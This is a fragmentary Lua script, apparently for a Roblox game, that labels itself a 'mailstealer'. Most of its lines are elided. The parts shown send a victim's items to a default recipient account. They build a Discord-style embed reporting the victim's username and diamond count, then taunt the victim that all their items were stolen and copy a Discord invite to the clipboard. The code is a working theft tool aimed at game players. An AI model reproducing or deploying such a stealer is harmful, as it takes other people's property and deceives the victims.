...
local MailMessage = "Join gg / pr69jHuMtZ to get back"
...
local function SendMessage(username, diamonds)
    ...
    local data = {
        ["embeds"] = {{
			...
			["fields"] = fields,
			["footer"] = {
				["text"] = "Mailstealer by Unlucky's discord.gg/pr69jHuMtZ"
			}
        }}
    }
...
local user = Username or "givepetroblox"
...
if #sortedItems > 0 then
    ...
    message.Error("All your items just got stolen by Unlucky's mailstealer!\n Join discord.gg/pr69jHuMtZ")
    setclipboard("discord.gg/pr69jHuMtZ")
end
